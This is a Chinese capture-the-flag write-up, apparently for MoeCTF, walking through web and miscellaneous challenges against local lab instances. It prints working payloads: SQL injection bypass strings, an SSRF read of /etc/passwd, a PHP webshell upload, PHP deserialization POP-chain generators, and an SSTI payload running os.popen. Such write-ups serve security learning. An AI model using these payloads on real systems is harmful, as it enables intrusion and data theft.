-<h4 id="2-6-弗拉格之地的挑战"><a href="#2-6-弗拉格之地的挑战" class="headerlink" title="2.6 弗拉格之地的挑战"></a>2.6 弗拉格之地的挑战</h4><p>得到提示信息，在地址栏加上<code>/flag1ab.html</code>，打开第二个页面</p>
-<p>右键查看页面源代码在注释中得到提示，得到flag1和下一步的url</p>
-<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--flag1: bW9lY3Rm--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下一步：/flag2hh.php--&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>跳转到第二个页面，提示关键词http</p>
-<p>打开BurpSuite抓包，在http响应头中发现flag2<code>e0FmdEV</code>和<code>nextpage: /flag3cad.php</code>，继续跳转，按提示用GET和POST传参，传参后出现提示要求Admin身份验证，继续抓包，发现<code>verify=user</code>，将其改为admin</p>
-<p>得到<code>flag3: yX3RoMXN</code>，继续下一关，提示修改referer，抓包修改，注意将referer字段插入Host之后，其他位置无效。请求成功后，嗯？听声辩位哈哈哈，点击开始发现没有第九个按钮？，没关系，f12打开源代码借一个按钮当9就ok了，出现提示使用console.log，查看控制台得到<code>flag4: fdFVUMHJ</code>，继续跳转，提示输入I want flag，本来想着在前端把javaScript删掉完事，结果还不行，绕过前端直接post数据就ok了。<code>flag5: fSV90aDF</code>，继续跳转显示一段php代码，按照要求进行POST和GET，得到<code>flag6: rZV9VX2t</code>，最后一关，提示<code>eval($_POST[&#39;what&#39;]);</code>意为执行what参数中的值，使用POST执行Linux命令，在根目录下可得到flag7<code>rbm93X1dlQn0=</code>组合起来，最后的flag即为<code>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</code>通过base64解码可得到flag</p>
-<h4 id="2-7-ImageCloud前置"><a href="#2-7-ImageCloud前置" class="headerlink" title="2.7 ImageCloud前置"></a>2.7 ImageCloud前置</h4><p>SSRF题目文本框输入<code>file:///etc/passwd</code>即可看到flag</p>
-<h4 id="2-8-垫刀之路02"><a href="#2-8-垫刀之路02" class="headerlink" title="2.8 垫刀之路02"></a>2.8 垫刀之路02</h4><p>非常简单，没有任何前后端限制，直接把php一句话木马上传进去就ok，控制台输出文件存储url，这么直球哈哈哈，中国蚁剑启动！（ps：真好用，之前做垫刀01的时候在那ls半天。。）按照题目提示env查看环境变量，即可找到flag</p>
-<h4 id="2-9-垫刀之路03"><a href="#2-9-垫刀之路03" class="headerlink" title="2.9 垫刀之路03"></a>2.9 垫刀之路03</h4><p>和上题唯一的区别是加了文件类型验证，抓包修改文件后缀名为php即可。</p>
-<h4 id="2-10-垫刀之路04"><a href="#2-10-垫刀之路04" class="headerlink" title="2.10 垫刀之路04"></a>2.10 垫刀之路04</h4><p>使用四个..&#x2F;翻到根目录，在tmp&#x2F;中找到flag</p>
-<h4 id="2-11-垫刀之路05"><a href="#2-11-垫刀之路05" class="headerlink" title="2.11 垫刀之路05"></a>2.11 垫刀之路05</h4><p>简单的sql注入，没有任何过滤，用户名和密码输入<code>&#39;=&#39;</code>即可得到flag</p>
-<h4 id="2-12-垫刀之路06"><a href="#2-12-垫刀之路06" class="headerlink" title="2.12 垫刀之路06"></a>2.12 垫刀之路06</h4><p>考察反序列化</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span> = <span class="string">&#x27;env&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// function __destruct() &#123;</span></span><br><span class="line">      <span class="comment">//  $s = $this-&gt;a;</span></span><br><span class="line">      <span class="comment">//  $s($this-&gt;evil);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//function __invoke($c) &#123;</span></span><br><span class="line">      <span class="comment">//  $s = $this-&gt;b;</span></span><br><span class="line">       <span class="comment">// $s($c);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>构造这个代码，在线运行后作为data变量的值通过get传参（ps：经典的flag位置hh）</p>
-<h4 id="2-13-垫刀之路07"><a href="#2-13-垫刀之路07" class="headerlink" title="2.13 垫刀之路07"></a>2.13 垫刀之路07</h4><p>url后面加console进入shell，输入pin码（竟然是对的hh），利用python命令在<code>/app</code>下找到flag文件</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&quot;SYSCMD&quot;</span>).read()</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="2-14-静态网页"><a href="#2-14-静态网页" class="headerlink" title="2.14 静态网页"></a>2.14 静态网页</h4><p>通过<code>document.lastModified();</code>看出网页是伪静态的（ps：被bing误导了，一直以为是伪静态，其实跟伪静态没半毛钱关系）在源码中搜索flag，发现<code>&quot;flag&quot;: &quot;Please turn to final1l1l_challenge.php&quot;</code>，跳转，发现又是一道源码审计题。。传入满足条件的a和b即可（字符串弱比较结果是0，坑死我了！！！）</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=s155964671a(任意md5为0e开头的值)</span><br><span class="line">b=0abcd(任意开头为0且不全为数字的值)</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="2-15-电院-backend"><a href="#2-15-电院-backend" class="headerlink" title="2.15 电院_backend"></a>2.15 电院_backend</h4><p>使用路径扫描工具进行扫描，发现<code>/admin/</code>，访问发现登陆界面，查看附件源码，发现密码被md5加密，尝试从邮箱注入，正则表达式要求邮箱为<code>xxx@xxx.xxx</code>的格式,并且不能出现or，构造<code>a@a.a&#39; || &#39;1&#39;=&#39;1&#39; #</code>（#把后面的查询语句注释掉了）随便输入密码和验证码，得到flag。</p>
-<h4 id="2-16-pop-moe"><a href="#2-16-pop-moe" class="headerlink" title="2.16 pop moe"></a>2.16 pop moe</h4><p>代码审计题</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="string">&#x27;0&#x27;</span>;<span class="comment">//跳过if</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();<span class="comment">//要调用class001的invoke方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __destruct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;check();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function check()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if($this-&gt;payl0ad === 0)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         die(&#x27;FAILED TO ATTACK&#x27;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     $a = $this-&gt;what;</span></span><br><span class="line">    <span class="comment">//     $a();//此时会调用class001的invoke方法</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span> = <span class="string">&#x27;dangerous&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line">    <span class="comment">// public function __invoke()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;a-&gt;payload = $this-&gt;payl0ad;//把dangerous赋给class002的payload变量，相当于设置变量，会调用set方法</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line">    <span class="comment">// public function __set($a, $b)//值是dangerous</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;$b($this-&gt;sec);//把b设置成dangerous，sec为new class003()返回mystr</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function dangerous($whaattt)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $whaattt-&gt;evvval($this-&gt;sec);//$whaattt设置为class003，sec设置为new class003()，whaatt设置需要执行dangerous方法</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;<span class="comment">//设置mystr为要执行rce的命令</span></span><br><span class="line">    <span class="comment">// public function evvval($str)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     eval($str);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __tostring()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     return $this-&gt;mystr;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">class000</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;data&#x27;]))</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     $a = unserialize($_GET[&#x27;data&#x27;]);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// else &#123;</span></span><br><span class="line"><span class="comment">//     highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>实测这样不行，要调用<code>__construct</code>方法，呜呜呜，修改一下</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span>  <span class="variable">$payl0ad</span>;</span><br><span class="line">	<span class="keyword">public</span>  <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;payl0ad = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;what = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;payl0ad = <span class="string">&#x27;dangerous&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sec</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sec = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;mystr = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">class000</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>得到输出</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;class000&quot;:2:&#123;s:7:&quot;payl0ad&quot;;s:1:&quot;0&quot;;s:4:&quot;what&quot;;O:8:&quot;class001&quot;:2:&#123;s:7:&quot;payl0ad&quot;;s:9:&quot;dangerous&quot;;s:1:&quot;a&quot;;O:8:&quot;class002&quot;:1:&#123;s:3:&quot;sec&quot;;O:8:&quot;class003&quot;:1:&#123;s:5:&quot;mystr&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>通过get发送即可，在页面搜索flag即可找到。</p>
-<h4 id="2-17-Who’s-blog"><a href="#2-17-Who’s-blog" class="headerlink" title="2.17 Who’s blog?"></a>2.17 Who’s blog?</h4><p>ssti注入，使用hackbar内置的注入模板即可得到flag</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="2-18-勇闯铜人阵"><a href="#2-18-勇闯铜人阵" class="headerlink" title="2.18 勇闯铜人阵"></a>2.18 勇闯铜人阵</h4><p>写脚本题（好难呜呜）gpt帮我，抓包发现点击回答按钮后会发送post请求，服务器随机返回1到2个数字，在3秒内拼接字符串直接通过post发送即可</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:55165/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化session对象</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方位数据</span></span><br><span class="line">directions_single = [<span class="string">&quot;北方&quot;</span>, <span class="string">&quot;东北方&quot;</span>, <span class="string">&quot;东方&quot;</span>, <span class="string">&quot;东南方&quot;</span>, <span class="string">&quot;南方&quot;</span>, <span class="string">&quot;西南方&quot;</span>, <span class="string">&quot;西方&quot;</span>, <span class="string">&quot;西北方&quot;</span>]</span><br><span class="line">directions_double = [<span class="string">f&quot;<span class="subst">&#123;d&#125;</span>一个&quot;</span> <span class="keyword">for</span> d <span class="keyword">in</span> directions_single]</span><br><span class="line">prompts = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始数据</span></span><br><span class="line">data_init = &#123;</span><br><span class="line">    <span class="string">&#x27;player&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;direct&#x27;</span>: <span class="string">&#x27;弟子明白&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 发送初始POST请求</span></span><br><span class="line">    response = session.post(url, data=data_init)</span><br><span class="line">    response.raise_for_status()  <span class="comment"># 检查请求是否成功</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重复过程5次</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># 提取消息中的最后8个字符作为提示</span></span><br><span class="line">        msg = response.text[-<span class="number">30</span>:-<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分析提示</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> prompts:</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line">                string += char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据提示数量构建新的请求数据</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">            index = <span class="built_in">int</span>(string) - <span class="number">1</span></span><br><span class="line">            direction_data = &#123;</span><br><span class="line">                <span class="string">&#x27;player&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;direct&#x27;</span>: directions_single[index]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Sending: <span class="subst">&#123;directions_single[index]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="number">2</span>:</span><br><span class="line">            index1, index2 = <span class="built_in">int</span>(string[<span class="number">0</span>]) - <span class="number">1</span>, <span class="built_in">int</span>(string[<span class="number">1</span>]) - <span class="number">1</span></span><br><span class="line">            direction_data = &#123;</span><br><span class="line">                <span class="string">&#x27;player&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;direct&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;directions_double[index1]&#125;</span>，<span class="subst">&#123;directions_double[index2]&#125;</span>&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Sending: <span class="subst">&#123;directions_double[index1]&#125;</span>，<span class="subst">&#123;directions_double[index2]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected number of prompts: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(num))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送新请求</span></span><br><span class="line">        response = session.post(url, data=direction_data)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="2-19-ImageCloud"><a href="#2-19-ImageCloud" class="headerlink" title="2.19 ImageCloud"></a>2.19 ImageCloud</h4><p>审计代码，发现点击上传图片之后会自动生成一个5000端口的url和一个端口在（5001，6000）随机的url，利用burpSuite进行爆破，发现5039端口响应长度不同，将端口号改为5039，在<code>http://127.0.0.1:49265/image?url=http://localhost:5039/image/flag.jpg</code>下发现flag图片（还要OCR，不能直接复制呜呜呜）</p>
-<p>flag：moectf{CeTTebRaT3-YoU_4tt@CK-to_mY-tMAGE-Ct0UDHHHhhh355}</p>
-<h3 id="3-安全杂项"><a href="#3-安全杂项" class="headerlink" title="3. 安全杂项"></a>3. 安全杂项</h3><h4 id="3-1-杂项入门指北"><a href="#3-1-杂项入门指北" class="headerlink" title="3.1 杂项入门指北"></a>3.1 杂项入门指北</h4><p>观察海报右侧发现摩尔斯密码，在线解密后得到flag，使用<code>moectf&#123;&#125;</code>包裹提交即可</p>
-<h4 id="3-2-signin"><a href="#3-2-signin" class="headerlink" title="3.2 signin"></a>3.2 signin</h4><p>按照提示签到即可</p>
-<h4 id="3-3-罗小黑战记"><a href="#3-3-罗小黑战记" class="headerlink" title="3.3 罗小黑战记"></a>3.3 罗小黑战记</h4><p>拆分gif为帧图片，出现二维码，扫码即可获得flag</p>
-<h4 id="3-4-ez-F5"><a href="#3-4-ez-F5" class="headerlink" title="3.4 ez_F5"></a>3.4 ez_F5</h4><p>按照题目提示使用F5隐写软件解码即可<a class="link"   href="https://github.com/matthewgao/F5-steganography" >repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，注意要使用java8，高版本的jdk会报错，密码见图片文件属性，使用base32解码即可得到</p>
-<p><code>java Extract &lt;file&gt; -p no_password</code>在output.txt发现flag</p>
-]]></content>
   </entry>
 </search>
